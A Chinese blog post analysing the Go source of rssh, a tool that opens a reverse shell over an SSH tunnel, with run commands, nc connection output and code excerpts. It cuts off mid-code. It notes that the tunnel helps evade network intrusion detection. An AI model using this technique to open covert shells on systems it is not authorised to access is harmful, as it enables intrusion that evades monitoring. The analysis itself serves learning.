**作者：spoock**  
**来源：[](https://blog.spoock.com/2019/08/11/rssh/
"")**
## 1 说明
本文旨在分析[rssh](https://github.com/andrew-d/rssh)的源代码来学习利用ssh隧道来反弹shell.整个rssh只有１个347行的main文件，所以整体的逻辑结构也比较好分析．关于SSH端口转发的知识可以看[实战SSH端口转发](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html)这篇文章，非常清晰． 使用ssh进行隧道的好处：
1.SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据，同时能够将其他 TCP 端口的网络数据通过 SSH
链接来转发，并且自动提供了相应的加密及解密服务，这样能够避免被NIDS检测到；
2.SSH基本上在每个机器上面存在，不需要额外的条件;
rssh的说明是:
> This program is a simple reverse shell over SSH. Essentially, it opens a
> connection to a remote computer over SSH, starts listening on a port on the
> remote computer, and when connections are made to that port, starts a
> command locally and copies data to and from it.
翻译一下就是:rssh是一个利用SSH反弹shell的程序．原理就是通过SSH在远程服务器上监听一个端口，并执行远程服务器发送过来的数据(就相当于是代码执行了)
## 2 运行
在本地运行: go run main.go -a ‘127.0.0.1:2222’ -u user -i id_remote_rsa
IP.OF.REMOTE.MACHINE 正常运行就会如下的结果：
    go run main.go -a '127.0.0.1:2222' -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE
    [  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
此时，在服务器上面运行(IP.OF.REMOTE.MACHINE)运行 nc 127.0.0.1 2222 即可得到反弹shell.
    服务器端
    $ nc -c 127.0.0.1 2222
    $ id
    uid=1000(spoock) gid=1000(spoock) groups=1000(spoock),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
    客户端
    $ go run main.go -a '127.0.0.1:2222' -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE
    [  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
    [  info ] accepted connection from: 127.0.0.1:33016
## 3 分析
### 3.1 init & log
    func init() {
        // Global flags
        pf := mainCommand.PersistentFlags()
        pf.BoolVarP(&flagVerbose, "verbose", "v", false, "be more verbose")
        pf.BoolVarP(&flagQuiet, "quiet", "q", false, "be quiet")
        pf.BoolVarP(&flagTrace, "trace", "t", false, "be very verbose")
        // Local flags
        flags := mainCommand.Flags()
        flags.StringVarP(&flagSSHUsername, "username", "u", os.Getenv("USER"),
            "connect as the given user")
        flags.StringVarP(&flagSSHPassword, "password", "p", "",
            "use the given password to connect")
        flags.StringVarP(&flagSSHIdentityFile, "identity-file", "i", "",
            "use the given SSH key to connect to the remote host")
        flags.StringVarP(&flagAddr, "address", "a", "localhost:8080",
            "address to listen on on the remote host")
        flags.StringVarP(&flagCommand, "command", "c", "/bin/sh",
            "command to run")
    }
    func preRun(cmd *cobra.Command, args []string) {
        var cl *colog.CoLog
        logger, cl = makeLogger()
        if flagTrace {
            cl.SetMinLevel(colog.LTrace)
        } else if flagVerbose {
            cl.SetMinLevel(colog.LDebug)
        } else if flagQuiet {
            cl.SetMinLevel(colog.LWarning)
        } else {
            cl.SetMinLevel(colog.LInfo)
        }
    }
在init()函数中主要是对一些参数的解释说明，同时也有对参数的校验的功能．
  * flagVerbose flagQuiet flagTrace 三者是表示日志的详细程度
  * username password identity-file 表示ssh登录认证的方法 可以使用那个用户名密码的方式也可以使用是公钥登录
  * address 远程服务器需要监听的端口，一般写为localhost:2222 或者是127.0.0.1:222 (写成localhost或者是127.0.0.1)
  * command 默认值是/bin/sh，是用来执行命令的shell环境
### 3.2 runMain
runMain函数是rssh的主体．我们以`go run main.go -a '127.0.0.1:2222' -u USERNAME -p
PASSWORD IP.OF.REMOTE.MACHINE`为例来说明参数的含义
#### 3.2.1 sshHost
    if len(args) != 1 {
        log.Printf("error: invalid number of arguments (expected 1, got %d)", len(args))
        os.Exit(1)
    }
    sshHost := args[0]
    // Add a default ':22' after the end if we don't have a colon.
    if !strings.Contains(sshHost, ":") {
        sshHost += ":22"
    }
判断远程地址需要存在，默认加上22端口．
#### 3.2.2 config.Auth
    // Password auth or prompt callback
    if flagSSHPassword != "" {
        log.Println("trace: adding password auth")
        config.Auth = append(config.Auth, ssh.Password(flagSSHPassword))
    } else {
        log.Println("trace: adding password callback auth")
        config.Auth = append(config.Auth, ssh.PasswordCallback(func() (string, error) {
            prompt := fmt.Sprintf("%s@%s's password: ", flagSSHUsername, sshHost)
            return speakeasy.Ask(prompt)
        }))
    }
    // Key auth
    if flagSSHIdentityFile != "" {
        auth, err := loadPrivateKey(flagSSHIdentityFile)
        if err != nil {
            log.Fatalf("error: could not load identity file '%s': %s",
                flagSSHIdentityFile, err)
        }
        log.Println("trace: adding identity file auth")
        config.Auth = append(config.Auth, auth)
    }
判断是通过用户名密码还是publickey的方式登录，分别进行不同的初始化的操作， **config.Auth = append(config.Auth,
ssh.Password(flagSSHPassword))** 或者是 **auth, err :=
loadPrivateKey(flagSSHIdentityFile);config.Auth = append(config.Auth, auth)**
一个有意思的地方，如果是这种方式 **go run main.go -a ‘127.0.0.1:2222’ -u USERNAME
IP.OF.REMOTE.MACHINE** 参数中没有密码，那么最终就会执行：
    log.Println("trace: adding password callback auth")
    config.Auth = append(config.Auth, ssh.PasswordCallback(func() (string, error) {
        prompt := fmt.Sprintf("%s@%s's password: ", flagSSHUsername, sshHost)
        return speakeasy.Ask(prompt)
    }))
此时实际的运行效果是:
    go run main.go -a '127.0.0.1:2222' -u USERNAME  IP.OF.REMOTE.MACHINE -t
    [ trace ] adding password callback auth                                                                                
    [ debug ] attempting 2 authentication methods ([0x666500 0x666650])                                         
    USERNAME@IP.OF.REMOTE.MACHINE:22's password: ［输入远程服务器SSH的密码］
    [  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
这种方式通过密码登录的方式同样也是可以的．
#### 3.2.3 sshConn
    sshConn, err := ssh.Dial("tcp", sshHost, config)
    if err != nil {
        log.Fatalf("error: error dialing remote host: %s", err)
    }
    defer sshConn.Close()
通过`ssh.Dial("tcp", sshHost, config)`与远程服务器上面创建ssh链接．此时的网络状态是:
     ss -anptw | grep 22 
    tcp   LISTEN      0       128             0.0.0.0:22             0.0.0.0:*                                                                                     
    tcp   ESTAB       0       0            172.16.1.2:60270   IP.OF.REMOTE.MACHINE:22      users:(("main",pid=29114,fd=5))                                               
    $ ps -ef | grep 29114
    spoock  29114 29034  0 15:46 pts/2    00:00:00 /tmp/go-build970759084/b001/exe/main -a 127.0.0.1:2222 -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE -t
与代码的执行情况是一致的．
#### 3.2.4 sshConn.Listen
这个就是rssh中的核心部分．代码如下：
    // Listen on remote
    l, err := sshConn.Listen("tcp", flagAddr)
    if err != nil {
        log.Fatalf("error: error listening on remote host: %s", err)
    }
其中的flagAddr就是参数中设置的127.0.0.1:2222，这就相当于在ssh的链接中再次监听了本地(此处的本地指的是服务器的地址)的2222端口．
跟着进入到ssh.Listen实现中： `vendor/golang.org/x/crypto/ssh/tcpip.go`
    // Listen requests the remote peer open a listening socket on
    // addr. Incoming connections will be available by calling Accept on
    // the returned net.Listener. The listener must be serviced, or the
    // SSH connection may hang.
    func (c *Client) Listen(n, addr string) (net.Listener, error) {
        laddr, err := net.ResolveTCPAddr(n, addr)
        if err != nil {
            return nil, err
        }
        return c.ListenTCP(laddr)
    }
这个函数的注释：Listen()函数创建了一个TCP连接listener，这个listener必须能够被维持，否则ssh连接就会被挂住．
进行跟踪进入ListenTCP, `vendor/golang.org/x/crypto/ssh/tcpip.go`
    // ListenTCP requests the remote peer open a listening socket
    // on laddr. Incoming connections will be available by calling
    // Accept on the returned net.Listener.
    func (c *Client) ListenTCP(laddr *net.TCPAddr) (net.Listener, error) {
        if laddr.Port == 0 && isBrokenOpenSSHVersion(string(c.ServerVersion())) {
            return c.autoPortListenWorkaround(laddr)
        }
        m := channelForwardMsg{
            laddr.IP.String(),